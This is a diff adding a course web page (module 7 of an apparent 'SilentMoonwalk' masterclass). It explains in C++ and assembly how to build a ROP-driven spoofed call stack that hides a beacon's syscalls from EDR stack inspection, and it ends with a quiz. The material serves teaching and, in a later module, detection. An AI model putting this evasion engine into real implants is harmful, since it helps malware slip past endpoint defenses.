@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: The Full Spoof Engine - SilentMoonwalk Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F319;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#06b6d4;--accent2:#0891b2;--gradient:linear-gradient(135deg,#06b6d4,#0891b2)}</style>
+</head>
+<body>
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+<nav>
+  <div class="logo"><h2>SilentMoonwalk Course</h2><span>Call Stack Spoofing Masterclass</span></div>
+  <a class="home-link" href="../SilentMoonwalk_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span class="diff d1">1</span> EDR Stack Telemetry</a>
+  <a class="mod-link" href="module2.html"><span class="diff d1">2</span> x64 Stack Frames</a>
+  <a class="mod-link" href="module3.html"><span class="diff d1">3</span> ROP Fundamentals</a>
+  <a class="mod-link" href="module4.html"><span class="diff d2">4</span> Desync Theory</a>
+  <a class="mod-link" href="module5.html"><span class="diff d2">5</span> Gadget Discovery</a>
+  <a class="mod-link" href="module6.html"><span class="diff d2">6</span> Synthetic Frames</a>
+  <a class="mod-link active" href="module7.html"><span class="diff d3">7</span> Full Spoof Engine</a>
+  <a class="mod-link" href="module8.html"><span class="diff d3">8</span> Detection &amp; Counters</a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: The Full Spoof Engine</h1>
+<p class="subtitle">Assembling every piece into a complete, walkable, executable spoofed call stack.</p>
+
+<div class="card highlight">
+<h4>The Complete Picture</h4>
+<p>This module brings together everything from the previous six modules into SilentMoonwalk's end-to-end algorithm. We'll trace the complete lifecycle: from selecting a target call chain, through gadget matching and frame construction, to the actual ROP-driven syscall invocation with a fully spoofed stack. This is the algorithm that makes SilentMoonwalk a generation ahead of prior approaches.</p>
+</div>
+
+<h2>High-Level Algorithm Overview</h2>
+<p>SilentMoonwalk's spoofing engine executes in several phases. Each phase builds on the results of the previous one:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">SilentMoonwalk Execution Phases</h4>
+<div class="flow">
+<div class="box hl">Phase 1<br>Initialization</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Phase 2<br>Chain Selection</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Phase 3<br>Frame Fabrication</div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Phase 4<br>ROP Assembly</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Phase 5<br>Execution</div>
+</div>
+</div>
+
+<h2>Phase 1: Initialization</h2>
+<p>At startup, SilentMoonwalk scans loaded modules to build its gadget database and function catalog:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Phase 1: One-time initialization
+class SpoofEngine {
+    GadgetDB gadgets;
+    std::vector&lt;FunctionInfo&gt; functionCatalog;
+    HMODULE hNtdll;
+    HMODULE hKernel32;
+    HMODULE hKernelBase;
+
+    void Initialize() {
+        // 1. Get handles to system modules
+        hNtdll     = GetModuleHandleA("ntdll.dll");
+        hKernel32  = GetModuleHandleA("kernel32.dll");
+        hKernelBase = GetModuleHandleA("kernelbase.dll");
+
+        // 2. Build gadget database from all system modules
+        gadgets.Build(hNtdll);
+        gadgets.Build(hKernel32);
+        gadgets.Build(hKernelBase);
+
+        // 3. Catalog all functions with their frame sizes
+        CatalogFunctions(hNtdll);
+        CatalogFunctions(hKernel32);
+        CatalogFunctions(hKernelBase);
+
+        // 4. Identify critical termination frames
+        //    Every thread stack ends with these two frames
+        resolveTerminalFrames();
+    }
+
+    void resolveTerminalFrames() {
+        // All Windows threads have this at the bottom of their stack:
+        //   kernel32!BaseThreadInitThunk+0x14
+        //   ntdll!RtlUserThreadStart+0x21
+        // We need the RUNTIME_FUNCTION for each to compute
+        // their exact frame sizes for the synthetic chain.
+
+        DWORD64 imgBase;
+        pBaseThreadInitThunk = RtlLookupFunctionEntry(
+            (DWORD64)GetProcAddress(hKernel32, "BaseThreadInitThunk"),
+            &imgBase, NULL
+        );
+        pRtlUserThreadStart = RtlLookupFunctionEntry(
+            (DWORD64)GetProcAddress(hNtdll, "RtlUserThreadStart"),
+            &imgBase, NULL
+        );
+    }
+};</code></pre>
+
+<h2>Phase 2: Call Chain Selection</h2>
+<p>When a spoofed call is requested, SilentMoonwalk selects a realistic call chain. The chain must be plausible for the type of API being called. For example, a thread sleeping via <code>NtWaitForSingleObject</code> should show a chain involving the Sleep family of functions:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Phase 2: Select a plausible call chain for the target syscall
+struct CallChainSpec {
+    PVOID               targetApi;      // The actual API to call
+    std::vector&lt;PVOID&gt;  spoofedChain;   // Functions to appear on stack
+};
+
+CallChainSpec SelectCallChain(PVOID targetApi) {
+    CallChainSpec spec;
+    spec.targetApi = targetApi;
+
+    // Build a realistic chain ending at the standard thread entry
+    // For NtWaitForSingleObject, a typical chain might be:
+    //
+    //   NtWaitForSingleObject           (the syscall itself)
+    //   KERNELBASE!WaitForSingleObjectEx (wrapper that calls Nt*)
+    //   kernel32!SleepEx                 (high-level sleep function)
+    //   kernel32!Sleep                   (simplest sleep wrapper)
+    //   &lt;application function&gt;           (we skip this - too specific)
+    //   kernel32!BaseThreadInitThunk     (standard thread entry)
+    //   ntdll!RtlUserThreadStart         (thread bootstrap)
+
+    spec.spoofedChain = {
+        GetProcAddress(hKernelBase, "WaitForSingleObjectEx"),
+        GetProcAddress(hKernel32,   "SleepEx"),
+        GetProcAddress(hKernel32,   "Sleep"),
+        GetProcAddress(hKernel32,   "BaseThreadInitThunk"),
+        GetProcAddress(hNtdll,      "RtlUserThreadStart")
+    };
+
+    return spec;
+}</code></pre>
+
+<div class="card">
+<h4>Chain Plausibility</h4>
+<p>The spoofed chain should represent a <em>realistic</em> call path. An EDR might cross-reference the chain to verify that function A actually calls function B in its code. SilentMoonwalk selects functions from known call paths in the Windows API. For sleeping beacons, the Sleep &rarr; SleepEx &rarr; WaitForSingleObjectEx &rarr; NtWaitForSingleObject chain is one of the most common patterns in legitimate software.</p>
+</div>
+
+<h2>Phase 3: Frame Fabrication</h2>
+<p>With the call chain selected, SilentMoonwalk computes the frame size for each function and allocates the synthetic stack space:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Phase 3: Compute frame sizes and build synthetic frame map
+struct SyntheticFrame {
+    PRUNTIME_FUNCTION pFunc;
+    PUNWIND_INFO      pUnwind;
+    DWORD             frameSize;      // Allocation + pushes
+    DWORD             totalSize;      // Including return address slot
+    PVOID             returnAddr;     // Points into next function in chain
+    DWORD             stackOffset;    // Offset from synthetic stack base
+    std::vector&lt;RegisterSave&gt; savedRegs;  // Non-volatile reg saves
+};
+
+std::vector&lt;SyntheticFrame&gt; FabricateFrames(CallChainSpec&amp; spec) {
+    std::vector&lt;SyntheticFrame&gt; frames;
+    DWORD totalStackNeeded = 0;
+
+    for (size_t i = 0; i &lt; spec.spoofedChain.size(); i++) {
+        SyntheticFrame sf;
+        DWORD64 imageBase;
+
+        // Look up the RUNTIME_FUNCTION for this chain entry
+        sf.pFunc = RtlLookupFunctionEntry(
+            (DWORD64)spec.spoofedChain[i], &imageBase, NULL
+        );
+        sf.pUnwind = (PUNWIND_INFO)(imageBase + sf.pFunc->UnwindData);
+        sf.frameSize = ComputeFrameSize(sf.pUnwind);
+        sf.totalSize = sf.frameSize + 8; // +8 for return address
+
+        // Determine return address: point into the NEXT function
+        if (i + 1 &lt; spec.spoofedChain.size()) {
+            sf.returnAddr = FindReturnAddress(
+                /* next func's RUNTIME_FUNCTION */
+                LookupFunc(spec.spoofedChain[i + 1]),
+                imageBase
+            );
+        } else {
+            sf.returnAddr = NULL; // Terminal frame
+        }
+
+        // Parse saved register locations from unwind codes
+        sf.savedRegs = ParseRegisterSaves(sf.pUnwind);
+
+        sf.stackOffset = totalStackNeeded;
+        totalStackNeeded += sf.totalSize;
+        frames.push_back(sf);
+    }
+
+    return frames;
+}</code></pre>
+
+<h2>Phase 4: ROP Chain Assembly</h2>
+<p>This is the most complex phase. The synthetic frame data must simultaneously serve as a valid ROP chain for execution AND a valid unwind chain for inspection. SilentMoonwalk weaves gadget addresses into the frame data at positions that are both reachable during ROP execution and benign during unwinding:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Phase 4: Assemble the dual-purpose stack layout
+void AssembleRopChain(
+    PBYTE syntheticStack,
+    std::vector&lt;SyntheticFrame&gt;&amp; frames,
+    PVOID targetApi,
+    PVOID targetApiArgs[4],     // RCX, RDX, R8, R9
+    PVOID rbxTrampoline         // Pointer to memory holding targetApi addr
+) {
+    DWORD offset = 0;
+
+    // === STAGE A: Parameter setup (before the spoofed frames) ===
+    // Place POP gadgets to load API arguments into registers
+    // These execute first in the ROP chain
+
+    // pop rcx; ret -- loads first argument
+    *(PVOID*)(syntheticStack + offset) = gadgets.popRcx;
+    offset += 8;
+    *(PVOID*)(syntheticStack + offset) = targetApiArgs[0]; // RCX value
+    offset += 8;
+
+    // pop rdx; ret -- loads second argument
+    *(PVOID*)(syntheticStack + offset) = gadgets.popRdx;
+    offset += 8;
+    *(PVOID*)(syntheticStack + offset) = targetApiArgs[1]; // RDX value
+    offset += 8;
+
+    // pop r8; ret -- loads third argument
+    *(PVOID*)(syntheticStack + offset) = gadgets.popR8;
+    offset += 8;
+    *(PVOID*)(syntheticStack + offset) = targetApiArgs[2]; // R8 value
+    offset += 8;
+
+    // pop r9; ret -- loads fourth argument
+    *(PVOID*)(syntheticStack + offset) = gadgets.popR9;
+    offset += 8;
+    *(PVOID*)(syntheticStack + offset) = targetApiArgs[3]; // R9 value
+    offset += 8;
+
+    // === STAGE B: JMP [RBX] trampoline ===
+    // RBX was set up earlier to point to memory containing targetApi addr
+    // The JMP transfers control WITHOUT pushing a return address
+    *(PVOID*)(syntheticStack + offset) = gadgets.jmpRbx;
+    offset += 8;
+
+    // === STAGE C: Fake return address ===
+    // When targetApi executes RET, it pops this address.
+    // This is where the spoofed stack begins from the unwinder's view.
+    // It points into the first function in our spoofed chain.
+    *(PVOID*)(syntheticStack + offset) = frames[0].returnAddr;
+    offset += 8;
+
+    // === STAGE D: Synthetic frames ===
+    // Each frame occupies exactly the right number of bytes
+    for (size_t i = 0; i &lt; frames.size(); i++) {
+        SyntheticFrame&amp; sf = frames[i];
+
+        // Fill frame body with plausible data
+        // The local variable area can contain recovery gadgets
+        FillFrameBody(syntheticStack + offset, sf);
+
+        // Place saved register values at correct offsets
+        for (auto&amp; reg : sf.savedRegs) {
+            *(DWORD64*)(syntheticStack + offset + reg.stackOffset) =
+                GeneratePlausibleRegValue(hNtdll, hKernel32);
+        }
+
+        // Place return address at end of frame
+        *(PVOID*)(syntheticStack + offset + sf.frameSize) = sf.returnAddr;
+
+        offset += sf.totalSize;
+    }
+}</code></pre>
+
+<div class="card warn">
+<h4>The Dual-Purpose Challenge</h4>
+<p>The stack bytes between the JMP [RBX] trampoline and the first return address serve double duty. During ROP execution, RSP advances through parameter setup gadgets and then the trampoline transfers to the target API. During stack unwinding (triggered by an EDR), the unwinder starts at the return address and walks backward through the synthetic frames. These two traversals operate on overlapping but different portions of the stack data, which is why careful offset calculation is essential.</p>
+</div>
+
+<h2>Phase 5: Execution</h2>
+<p>With the synthetic stack fully assembled, SilentMoonwalk pivots RSP to the synthetic stack and begins the ROP chain. This is done via an assembly stub:</p>
+
+<pre><code><span class="lang-tag">x86-64 ASM</span>; SilentMoonwalk's execution stub (simplified)
+; Called from C++ with the synthetic stack address in RCX
+
+SpoofAndCall PROC
+    ; Save all non-volatile registers (callee-saved)
+    push rbp
+    push rbx
+    push rdi
+    push rsi
+    push r12
+    push r13
+    push r14
+    push r15
+
+    ; Save the real RSP so we can restore it later
+    mov r15, rsp           ; R15 = real stack pointer (saved)
+
+    ; Set up RBX for the JMP [RBX] trampoline
+    ; RCX = pointer to struct { PVOID pTargetApi; BYTE syntheticStack[...]; }
+    lea rbx, [rcx]         ; RBX = pointer to target API address
+
+    ; Pivot RSP to the synthetic stack
+    ; The ROP chain starts at offset 8 in the synthetic buffer
+    lea rsp, [rcx + 8]     ; RSP now points to our ROP chain
+
+    ; Begin ROP execution:
+    ; RSP -> [pop rcx gadget addr]
+    ;        [RCX value]
+    ;        [pop rdx gadget addr]
+    ;        [RDX value]
+    ;        ... (parameter setup)
+    ;        [JMP [RBX] gadget addr]
+    ;
+    ; The first RET pops and jumps to pop rcx gadget.
+    ; Each gadget's RET chains to the next.
+    ; JMP [RBX] transfers to the target API.
+    ; Target API's RET lands on our spoofed return address.
+
+    ret                    ; Start the ROP chain!
+
+    ; === Recovery point ===
+    ; After the target API returns through the spoofed chain,
+    ; a recovery gadget redirects execution here
+RecoveryPoint:
+    ; Restore real RSP
+    mov rsp, r15
+
+    ; Restore non-volatile registers
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rsi
+    pop rdi
+    pop rbx
+    pop rbp
+
+    ret                    ; Return to caller with spoofed call complete
+SpoofAndCall ENDP</code></pre>
+
+<h2>The Recovery Mechanism</h2>
+<p>After the target API returns through the spoofed stack frames, execution must return to the real code. SilentMoonwalk embeds a recovery gadget address within the synthetic frames that, when reached during ROP unwinding, redirects execution back to the recovery point:</p>
+
+<pre><code><span class="lang-tag">C++</span>// The recovery mechanism:
+// 1. Target API (e.g., NtWaitForSingleObject) returns
+// 2. It pops the first spoofed return address from the stack
+// 3. Execution lands at the first frame's "body" area
+// 4. The frame body contains an ADD RSP, N; RET gadget that
+//    advances RSP through the frame to the next return address
+// 5. This chain continues through each synthetic frame
+// 6. The last frame's return address points to the RecoveryPoint
+//    in the assembly stub
+// 7. Execution returns to the real caller with the original RSP
+
+// Alternatively, a simpler recovery approach:
+// The first spoofed return address can directly point to a
+// gadget that restores RSP from a saved register (e.g., R15):
+//   mov rsp, r15
+//   ret
+// This immediately collapses the synthetic stack and returns
+// to the real code. However, this gadget is harder to find
+// with valid unwind metadata.</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete Execution Timeline</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:600px;margin:0 auto">
+<div class="box hl" style="width:100%;text-align:left"><strong>1.</strong> Save real RSP, pivot to synthetic stack</div>
+<div class="box g" style="width:100%;text-align:left"><strong>2.</strong> ROP: POP RCX/RDX/R8/R9 (load arguments)</div>
+<div class="box g" style="width:100%;text-align:left"><strong>3.</strong> ROP: JMP [RBX] &rarr; target API begins executing</div>
+<div class="box y" style="width:100%;text-align:left"><strong>4.</strong> Target API runs (stack looks clean to any inspector)</div>
+<div class="box g" style="width:100%;text-align:left"><strong>5.</strong> Target API RET &rarr; pops spoofed return address</div>
+<div class="box g" style="width:100%;text-align:left"><strong>6.</strong> ROP: Recovery gadgets chain through synthetic frames</div>
+<div class="box hl" style="width:100%;text-align:left"><strong>7.</strong> Restore real RSP, return to original caller</div>
+</div>
+</div>
+
+<h2>Handling the Syscall Boundary</h2>
+<p>For direct syscalls (where the beacon invokes the syscall instruction directly rather than calling through ntdll), SilentMoonwalk must ensure the stack is clean <em>at the exact moment</em> the syscall instruction executes. The kernel captures the user-mode stack trace at syscall entry:</p>
+
+<pre><code><span class="lang-tag">C++</span>// For direct syscall invocation with spoofed stack:
+// The synthetic stack must be in place BEFORE the syscall instruction.
+//
+// Approach:
+// 1. Build synthetic stack as above
+// 2. Place the syscall stub (mov r10, rcx; mov eax, SSN; syscall)
+//    at the bottom of the ROP chain, OR
+// 3. Use the JMP [RBX] gadget to jump to ntdll's syscall stub
+//    (the actual 'syscall' instruction inside ntdll)
+//
+// Option 3 is preferred because:
+// - The return address on the stack (pushed by nothing - we used JMP)
+//   is our spoofed address pointing into a legitimate function
+// - The kernel sees RSP pointing to our synthetic stack
+// - ETW stack capture walks our synthetic frames correctly
+// - The syscall instruction itself is inside ntdll (legitimate location)</code></pre>
+
+<div class="card green">
+<h4>The Elegance of JMP-Based Syscalls</h4>
+<p>By using JMP [RBX] to reach ntdll's syscall stub instead of CALL, SilentMoonwalk avoids pushing any return address. The stack at the moment of syscall execution contains only the synthetic frames. The kernel's ETW stack walker processes these frames using RtlVirtualUnwind and sees a completely normal call chain. This is why JMP [RBX] is the linchpin of the entire technique.</p>
+</div>
+
+<h2>Complete Data Flow</h2>
+<p>Here is the complete data dependency between all components:</p>
+
+<table>
+<tr><th>Component</th><th>Inputs</th><th>Outputs</th><th>Consumed By</th></tr>
+<tr><td>Module Scanner</td><td>ntdll, kernel32 .pdata</td><td>Function catalog + UNWIND_INFO</td><td>Gadget search, frame fabrication</td></tr>
+<tr><td>Gadget Scanner</td><td>.text sections, RUNTIME_FUNCTIONs</td><td>Gadget database (indexed by type/size)</td><td>ROP chain assembly</td></tr>
+<tr><td>Chain Selector</td><td>Target API identity</td><td>Ordered list of spoofed functions</td><td>Frame fabrication</td></tr>
+<tr><td>Frame Fabricator</td><td>Chain spec + UNWIND_INFOs</td><td>Frame sizes, register save maps, return addrs</td><td>ROP assembly</td></tr>
+<tr><td>ROP Assembler</td><td>Gadgets + frames + API args</td><td>Synthetic stack buffer</td><td>Execution stub</td></tr>
+<tr><td>Execution Stub</td><td>Synthetic stack + RSP pivot</td><td>API call with spoofed stack</td><td>Target API</td></tr>
+</table>
+
+<div class="quiz" id="quiz7">
+<h4>Pop Quiz: The Full Spoof Engine</h4>
+<div class="quiz-q" data-correct="3">
+<p>Q1: Why does SilentMoonwalk use JMP [RBX] to invoke the target API instead of CALL?</p>
+<label data-opt="0"><input type="radio" name="q7_0"> Because CALL is blocked by CFG</label>
+<label data-opt="1"><input type="radio" name="q7_0"> Because JMP is faster than CALL</label>
+<label data-opt="2"><input type="radio" name="q7_0"> Because the target API doesn't have a return address</label>
+<label data-opt="3"><input type="radio" name="q7_0"> Because JMP doesn't push a return address, so the stack at syscall time contains only the pre-arranged synthetic frames</label>
+<div class="explain">CALL would push a return address pointing back into the ROP chain (potentially unbacked memory), contaminating the spoofed stack. JMP transfers control without modifying RSP, so the stack remains exactly as SilentMoonwalk arranged it. When the kernel captures the stack trace at syscall entry, it sees only clean synthetic frames.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: What are the "terminal frames" that every spoofed chain must end with?</p>
+<label data-opt="0"><input type="radio" name="q7_1"> kernel32!BaseThreadInitThunk and ntdll!RtlUserThreadStart</label>
+<label data-opt="1"><input type="radio" name="q7_1"> ntdll!LdrInitializeThunk and kernel32!BaseThreadInitThunk</label>
+<label data-opt="2"><input type="radio" name="q7_1"> Any two functions from ntdll</label>
+<label data-opt="3"><input type="radio" name="q7_1"> The first and last functions in the .pdata section</label>
+<div class="explain">Every legitimate Windows thread has BaseThreadInitThunk (the Win32 thread entry point) and RtlUserThreadStart (the native thread bootstrap) at the bottom of its stack. A spoofed chain must terminate with these frames to appear natural. Their absence is an immediate red flag to EDR stack analyzers.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: How does SilentMoonwalk return to the real caller after the target API completes?</p>
+<label data-opt="0"><input type="radio" name="q7_2"> It creates a new thread</label>
+<label data-opt="1"><input type="radio" name="q7_2"> The target API returns directly to the original caller</label>
+<label data-opt="2"><input type="radio" name="q7_2"> Recovery gadgets in the synthetic frames chain execution back to a recovery point that restores the real RSP</label>
+<label data-opt="3"><input type="radio" name="q7_2"> It uses an exception handler to catch the return</label>
+<div class="explain">After the target API returns through the spoofed frames, gadgets embedded in the frame bodies (ADD RSP, N; RET sequences) advance execution through the synthetic stack until reaching a recovery point. This recovery code restores the original RSP from a saved register, collapsing the synthetic stack and returning control to the real caller.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Previous: Synthetic Frames</a>
+<a class="primary" href="module8.html">Next: Detection &amp; Countermeasures &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
